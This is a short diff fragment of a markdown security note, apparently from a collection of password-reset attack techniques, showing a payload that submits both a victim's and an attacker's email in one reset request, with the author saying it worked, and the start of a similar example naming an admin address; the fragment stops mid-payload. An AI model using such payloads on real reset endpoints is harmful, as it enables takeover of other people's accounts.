@@ -37,6 +37,7 @@ GET /passwordreset
 - {"email":["victim@xyz.tld","hacker@xyz.tld"]}
 ```
 The last one worked for me by entering both emails like this.
+
 ```bash
 {
     "email":["admin@practical.tech",
